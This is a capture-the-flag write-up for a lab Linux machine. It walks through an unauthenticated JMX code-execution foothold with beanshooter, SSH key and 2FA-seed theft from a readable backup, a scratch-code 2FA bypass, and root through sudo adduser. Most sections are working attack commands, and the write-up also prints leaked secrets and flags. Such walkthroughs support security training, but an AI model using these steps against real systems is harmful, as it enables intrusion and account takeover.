# Manage — Writeup

**Machine**: Manage | **OS**: Linux | **Difficulty**: Easy | **Date**: 2026-05-26

## Chain: JMX RCE → Backup Archive → SSH 2FA Bypass → sudo adduser → Admin Group → Root

### 1. Recon
```
22/tcp   ssh           OpenSSH 8.9p1
2222/tcp java-rmi      Java RMI (jmxrmi → @127.0.1.1:38817)
8080/tcp http           Apache Tomcat 10.1.19
```

### 2. Foothold — JMX via beanshooter

```bash
java -jar beanshooter.jar standard 10.129.234.57 2222 tonka
java -jar beanshooter.jar tonka shell 10.129.234.57 2222
```

Alternative (MLet-based): `tonka deploy --stager-url` then `tonka exec` for single commands.

### 3. User Flag via Lateral Movement

**Backup archive** in `/home/useradmin/backups/backup.tar.gz` is world-readable. Extract reveals:
- `.ssh/id_ed25519` — SSH private key
- `.google_authenticator` — TOTP seed `CLSSSMHYGLENX5HAIFBQ6L35UM` + 10 scratch codes

**SSH 2FA**: `AuthenticationMethods publickey,keyboard-interactive` requires key + OTP. Use a scratch code (single-use) from `.google_authenticator`:

```bash
ssh -i .ssh/id_ed25519 useradmin@10.129.234.57
# (useradmin@10.129.234.57) Verification code: 20312647
```

**User flag**: `a86d44c7243b65a9171cf7da3e0bc279` at `/opt/tomcat/user.txt`

### 4. Privilege Escalation — sudo adduser → Admin Group

```
$ sudo -l
(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$

$ sudo /usr/sbin/adduser admin
# Creates user 'admin' with group 'admin' (default admin group has full sudo)
```

### 5. Root Flag

```bash
echo admin123 | su admin -c "echo admin123 | sudo -S cat /root/root.txt"
```

**Root flag**: `b3645b7e6db6d5276ad33f0c75b8dc34`

### Automation Notes

- **Bypass SSH 2FA in automation**: Don't fight SSH keyboard-interactive when you already have RCE. Use the JMX shell (`tonka exec`) to run `su admin -c "sudo -S ..."` directly on target, avoiding SSH entirely.
- **Scratch codes are single-use**: Each can only be used once. Use expect for interactive SSH.
- **sudo adduser regex**: Only matches `^[a-zA-Z0-9]+$` — no additional flags. Must use `-tt` for PTY allocation.

### Key Lessons
- Java RMI JMX without auth = RCE via MBean deployment
- Backup archives with lax permissions leak SSH keys + 2FA seeds
- Ubuntu's `admin` group grants full sudo — creating a user named `admin` auto-adds to admin group
- Always escalate via existing shell before fighting SSH 2FA prompts
